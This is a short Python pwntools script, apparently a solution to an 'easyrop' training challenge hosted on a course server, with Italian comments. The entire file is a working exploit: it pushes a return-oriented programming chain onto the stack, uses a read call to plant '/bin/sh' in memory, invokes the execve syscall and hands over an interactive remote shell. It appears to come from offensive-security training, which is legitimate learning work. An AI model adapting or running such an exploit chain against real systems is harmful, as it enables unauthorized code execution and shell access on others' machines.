#! /usr/bin/python3
import pwn
import time

def onstack_32(number):
    r.send(pwn.packing.p32(0, sign="signed", endian="little"))
    time.sleep(0.1)
    r.send(pwn.packing.p32(number, sign="signed", endian="little"))

def onstack_64(number):
    first_half = number & 0xffffffff
    second_half = number >> 32
    onstack_32(first_half)
    onstack_32(second_half)

#def onstack_64(value_64):
#    firsthalf = value_64 & 0xffffffff
#    secondhalf = value_64 >> 32
#    onstack_32(firsthalf)
#    onstack_32(secondhalf)
#pwn.context.log_level='DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh= ssh("username","ip")
# r= ssh.process("./multistage")                    multistage name of the process

#pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./easyrop")
##b * 0x0040028b
#pwn.gdb.attach(r, '''
#c
#''' )

rop=[0x7, 0x7, 0x7, 0x7, 0x7, 0x7, 0x7]
pop_rdi_pop_rsi_pop_rdx_pop_rax_ret = 0x00000000004001c2
read=0x00400144
syscall=0x00400168
rop += [ pop_rdi_pop_rsi_pop_rdx_pop_rax_ret ,
0,
0x600500,
15,
0,
read,
pop_rdi_pop_rsi_pop_rdx_pop_rax_ret,
0x600500,
0,
0,
59,
syscall
]

pwn.context.arch = "amd64"
r=pwn.remote("bin.training.offdef.it",2015)
r.recv()
input("wait")
for i in rop:
    onstack_64(i)
r.send("\n")
time.sleep(1)
r.send("\n")
time.sleep(1)
r.send(b'////bin/sh\x00')
r.interactive()
